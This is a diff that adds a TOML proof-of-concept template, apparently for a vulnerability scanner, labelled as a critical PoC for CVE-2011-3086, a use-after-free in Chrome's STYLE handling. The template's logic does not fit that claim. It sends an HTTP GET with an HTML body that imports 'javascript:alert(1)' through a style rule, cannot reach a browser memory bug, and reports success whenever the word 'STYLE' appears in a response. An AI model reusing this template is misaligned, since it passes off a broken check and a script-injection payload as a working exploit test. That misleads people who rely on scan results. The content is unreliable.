@@ -1,0 +1,29 @@
+[info]
+author = "ave"
+description = "Google Chrome在19.0.1084.46之前版本中存在使用后释放漏洞，与STYLE元素处理有关。远程攻击者可通过构造包含特制样式元素的HTML页面，触发内存错误引用，导致拒绝服务或可能造成未指定的其他影响。该漏洞无需身份认证即可利用，影响所有使用受影响Chrome版本的终端用户。"
+id = "POC-AVE-2011-0210"
+name = "CVE-2011-3086 PoC"
+severity = "critical"
+tags = ["ave-2011-0210"]
+vuln_id = [
+    "CVE-2011-3086",
+    "AVE-2011-0210",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/poc.html"
+protocol = "http"
+
+[poc.requests.body]
+content = '<html><head><style>@import url("javascript:alert(1)");</style></head><body><div id="target">test</div></body></html>'
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["STYLE"]
